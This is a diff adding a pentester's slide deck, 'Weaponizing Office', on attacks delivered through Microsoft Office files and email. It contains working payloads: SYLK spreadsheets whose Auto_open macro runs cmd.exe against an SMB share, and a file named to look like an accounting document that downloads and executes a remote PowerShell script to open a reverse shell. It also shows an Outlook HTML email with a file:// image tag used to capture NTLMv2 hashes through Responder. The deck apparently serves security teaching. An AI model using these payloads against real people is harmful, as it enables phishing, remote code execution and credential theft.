@@ -1,0 +1,119 @@
+---
+title: "Weaponizing Office"
+author: Patrick Sukop (twitter.com/iKnadt)
+patat:
+    key: val
+    slideLevel: 1
+    wrap: true
+    margins:
+     left: 3
+     right: 10
+    images:
+     backend: 'w3m'
+     path: '/usr/lib/w3m/w3mimgdisplay'
+    theme:
+     header: [dullWhite,bold]
+     bulletList: [dullGreen]
+     orderedList: [dullGreen]
+     code: [onDullWhite,dullBlack]
+     codeBlock: [onDullWhite,dullBlack]
+...
+
+# who^^am^^i
+
+- Patrick Sukop
+- Pentester (Investec)
+- OSCP
+- I like to PARTY...
+
+## Contents
+
+1. Responder
+2. Excel (.SLK)
+3. Outlook (file://)
+4. Word (frameset)
+
+---
+
+# 1. Responder
+
+`(https://github.com/SpiderLabs/Responder)`
+
+Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authenticaion.
+
+## Idea
+
+- Office to send an non existent SMB address
+- Capture NTLMv2 hash using Responder 
+
+---
+
+# 2. Excel 
+
+<!--  
+An SLK file is a file saved in the Symbolic Link (SYLK) format created 
+by Microsoft to transfer data between spreadsheet programs and other databases.
+-->
+
+Symbolic Link (SYLK)
+
+## Payload
+
+`cmd.exe / c [COMMAND]`
+
+demo.slk:
+
+	ID;P
+	O;E
+	NN;NAuto_open;ER101C1;KOut Flank;F
+	C;X1;Y101;K0;EEXEC( "cmd.exe /c \\IP\IPC$" )
+	C;X1;Y102;K0;EHALT()
+	E
+
+- Works on CSV, howver there is an additional warning
+
+---
+
+## POC (Reverse Shell):
+
+Accounting_101.slk:
+
+	ID;P
+	O;E
+	NN;NAuto_open;ER101C1;KOut Flank;F
+	C;X1;Y101;K0;EEXEC("
+
+	powershell IEX 
+	(New-Object Net.WebClient).DownloadString(
+	'http://192.168.56.101/test.ps1')
+
+	")
+	C;X1;Y102;K0;EHALT()
+	E
+
+---
+
+# 3. Outlook
+
+##Steps:
+1. Create HTML email
+2. `<img src="file://IP/fakeimage.png" />`
+3. Send email! Important!
+
+##Notes:
+- Right Click -> Download Images.
+	- ^^ Only once.
+
+##POC (Responder):
+
+---
+
+# 4. Word (DDE):
+
+
+---
+
+DDE:
+`http://willgenovese.com/office-ddeauto-attacks/`
+
+THANK YOU!!!
